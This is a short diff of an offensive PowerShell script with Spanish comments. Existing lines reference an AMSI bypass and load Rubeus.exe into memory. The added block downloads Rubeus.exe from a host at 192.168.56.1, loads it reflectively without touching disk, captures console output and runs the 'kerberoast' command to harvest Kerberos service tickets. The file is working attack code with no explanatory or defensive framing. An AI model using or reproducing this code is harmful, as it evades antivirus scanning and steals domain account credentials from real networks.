@@ -40,3 +40,16 @@ Write-Host "[+] AMSI bypassed"
 # Ahora carga assemblies sin detección
 $bytes = [System.IO.File]::ReadAllBytes("C:\path\to\Rubeus.exe")
 [System.Reflection.Assembly]::Load($bytes)
+
+
+
+
+
+$data = (New-Object Net.WebClient).DownloadData("http://192.168.56.1/Rubeus.exe");
+$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
+$out = [Console]::Out;
+$sWriter = New-Object IO.StringWriter;
+[Console]::SetOut($sWriter);
+[Rubeus.Program]::Main("kerberoast");
+[Console]::SetOut($out);
+$sWriter.ToString()
